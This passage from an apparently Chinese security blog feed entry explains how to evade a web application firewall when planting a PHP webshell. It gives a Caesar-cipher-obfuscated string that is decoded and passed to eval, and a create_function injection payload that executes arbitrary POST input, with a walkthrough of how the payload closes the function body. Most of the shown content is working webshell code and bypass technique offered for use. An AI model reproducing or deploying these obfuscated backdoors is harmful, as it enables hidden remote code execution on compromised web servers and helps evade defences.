-<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">kaisa</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-<span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<h3 id="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><a href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话" class="headerlink" title="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"></a>这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</h3><p></p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$arr</span><span class="token operator">=</span><span class="token string">"j{fq-)dUTXY`}b.@"</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-<span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<h2 id="利用函数代码执行来代替eval"><a href="#利用函数代码执行来代替eval" class="headerlink" title="利用函数代码执行来代替eval"></a>利用函数代码执行来代替eval</h2><h3 id="利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><a href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行" class="headerlink" title="利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行"></a>利用 <a href="http://www.cnseay.com/1901/" target="_blank" rel="external">create_function代码执行漏洞</a> 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</h3><p>这里构造为$code = “n;}$_POST[x];/*”;<br>注意：双引号里面的变量会进行解析，即如果我们echo $code 并且post提交x=phpinfo();那么输出应该是：n;}phpinfo();;/</p>
-<p></p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-php"><code class="language-php">payload解析：
-
-<span class="token punctuation">;</span>来结束语句
-
-<span class="token punctuation">}</span>来结束函数体
-
-<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>就在函数体外面被eval执行了
-
-<span class="token operator">/</span><span class="token operator">*</span>注释多余的代码
-
-最终代码：<span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">function_lambda_func</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
-最终构造出
-
-<span class="token delimiter">&lt;?php</span>
-<span class="token variable">$args</span> <span class="token operator">=</span> <span class="token string">"１"</span><span class="token punctuation">;</span>
-<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">"n;}$_POST[x];/*"</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$args'</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<h3 id="这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><a href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起" class="headerlink" title="这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起"></a>这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</h3>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路&quot;&gt;&lt;a href=&quot;#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路&quot; class=&quot;headerlink&quot; title=&quot;很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路&quot;&gt;&lt;/a&gt;很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="shell" scheme="http://iosmosis.github.io/tags/shell/"/>
-    
-      <category term="waf" scheme="http://iosmosis.github.io/tags/waf/"/>
     
   </entry>
   
